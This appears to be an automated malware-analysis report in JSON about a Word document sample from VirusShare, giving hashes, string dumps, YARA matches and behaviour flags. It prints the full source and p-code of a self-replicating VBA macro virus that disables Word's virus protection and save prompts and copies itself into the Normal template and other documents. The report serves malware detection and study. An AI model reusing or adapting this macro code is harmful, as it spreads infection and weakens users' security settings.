{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "CodeModule": "May attempt to modify the VBA code",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Option Explicit\nSub AutoClose()\nSub AutoOpen()\n   Dim LineasPlantilla As Integer, LineasDoc As Integer\n   \n   Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False\n   LineasDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\n   LineasPlantilla = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines\n   If LineasPlantilla > 10 And LineasDoc > 10 Then GoTo Salir\n   If LineasPlantilla < 10 Then\n      ActiveDocument.VBProject.VBComponents.Item(1).Name = NormalTemplate.VBProject.VBComponents.Item(1).Name\n      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)\n      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, \"Sub AutoClose()\"\n   Else\n      If LineasDoc = 0 Then\n         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)\n         ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, \"Sub AutoOpen()\"\n      End If\n   End If\n   If (Len(ActiveDocument.Name) > 20) Then MsgBox \"Hola AMAIA, you gotta virus\", 48, \"(======Hobetuz======)  ;-)\"\nSalir:\nEnd Sub\n\n' Processing file: VirusShare_f95a2175d4d7bfe64df2bf8aa4cb2498\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 2756 bytes\n' Line #0:\n' \tOption  (Explicit)\n' Line #1:\n' \tFuncDefn (Sub AutoClose())\n' Line #2:\n' \tFuncDefn (Sub AutoOpen())\n' Line #3:\n' \tDim \n' \tVarDefn LineasPlantilla (As Integer)\n' \tVarDefn LineasDoc (As Integer)\n' Line #4:\n' Line #5:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' \tBoS 0x0000 \n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' \tBoS 0x0000 \n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #6:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt LineasDoc \n' Line #7:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt LineasPlantilla \n' Line #8:\n' \tLd LineasPlantilla \n' \tLitDI2 0x000A \n' \tGt \n' \tLd LineasDoc \n' \tLitDI2 0x000A \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo Salir \n' \tEndIf \n' Line #9:\n' \tLd LineasPlantilla \n' \tLitDI2 0x000A \n' \tLt \n' \tIfBlock \n' Line #10:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd New \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemSt New \n' Line #11:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #12:\n' \tLitDI2 0x0003 \n' \tLitStr 0x000F \"Sub AutoClose()\"\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #13:\n' \tElseBlock \n' Line #14:\n' \tLd LineasDoc \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #15:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #16:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' Line #17:\n' \tLitDI2 0x0003 \n' \tLitStr 0x000E \"Sub AutoOpen()\"\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall ReplaceLine 0x0002 \n' Line #18:\n' \tEndIfBlock \n' Line #19:\n' \tEndIfBlock \n' Line #20:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tFnLen \n' \tLitDI2 0x0014 \n' \tGt \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x001B \"Hola AMAIA, you gotta virus\"\n' \tLitDI2 0x0030 \n' \tLitStr 0x001A \"(======Hobetuz======)  ;-)\"\n' \tArgsCall MsgBox 0x0003 \n' \tEndIf \n' Line #21:\n' \tLabel Salir \n' Line #22:\n' \tEndSub \n"
    },
    "filename": "VirusShare_f95a2175d4d7bfe64df2bf8aa4cb2498",
    "filesize": 27136,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1255, Title: 1, Author: VIRUS-LAB3, Template: VS000120X.dot, Last Saved By: VIRUS-LAB3, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri Jan 11 06:57:00 1980, Last Saved Time/Date: Fri Jan 11 06:57:00 1980, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "f95a2175d4d7bfe64df2bf8aa4cb2498",
        "sha1": "9ac91807d2695e84170cf7d518d022d54642ed46",
        "sha256": "b39e5997c5725566f7f6ac3d9549bfcd7b168821b68c6a0d2545740e5d22a133"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u0203",
            ". A!",
            "VIRUS-LAB3",
            "VS000120X.dot",
            "VIRUS-LAB3",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Template",
            "Project",
            "9std",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation#",
            "Forms>",
            "FB8698",
            "F21-4699",
            "-11CF-BB",
            "D7-444558354",
            "WD#Microsoft ",
            " Libprary",
            "P4,PJP\\VBE\\(",
            "EX(.E",
            "CxOff",
            "icDxO@uf",
            "cBx+,2",
            "DF8D04C-",
            "5BFA-101@B-BDE5@xA*A@w4",
            "CHIVOS D",
            "E PROGRA",
            "MA\\MICRO",
            "SOFT OFF",
            "ICE\\",
            "MSO97.DLL",
            "\\C%P 8.0R\\",
            "hisDocum",
            "Sub AutoClose()",
            "Sub AutoOpen()",
            "Hola AMAIA, you gotta virus",
            "(======Hobetuz======)  ;-)A@D",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "2Option ",
            "licit",
            "ub AutoC",
            "l7()",
            "   Dim",
            " LineasP",
            "lantilla",
            " As Intepger,",
            "9s.Vi",
            "rusProtecA= Z: ",
            "SaveNormal",
            "Confirm",
            "vers",
            "4#QC= A",
            "Compon}",
            "s.Item(1",
            ").CodeMo",
            "dule",
            "unt4Of",
            "G>= '",
            "V> 10 AndHU",
            "Then GoTo Salir&",
            "`+BD",
            "FAddFromSngom(1,?",
            "^sa'@(@",
            "ntIRe\t@uce",
            " 3, \"m@",
            "f:X0 9",
            "L:=,",
            "Full)O",
            "#~44",
            "rErIfB]H",
            ") > ",
            "20)b8 MsgBox \"Ho",
            "MAIA, yo",
            "u gotta v\", 48D",
            "Hobet",
            ")  ;-)`",
            "1b37d7ea01",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "CEBO1W",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "TemplateProjectE",
            "Documentj",
            "AutoClose",
            "LineasPlantillaF",
            "LineasDoc",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "CountOfLines!\\",
            "NormalTemplateq",
            "Salir",
            "AddFromString",
            "Lines",
            "ReplaceLine",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "MsgBoxR",
            "AutoOpen*",
            "ID=\"{F27BF784-66E9-11D3-BBD7-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"TemplateProject\"",
            "HelpContextID=\"0\"",
            "CMG=\"D3D17937C13BC13BC13BC13B\"",
            "DPB=\"1F1DB58B4D9B989C989C98\"",
            "GC=\"6B69C15F0C600C60F3\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=110, 110, 597, 383, ",
            "ThisDocument",
            " Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "MSO97.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.300688",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
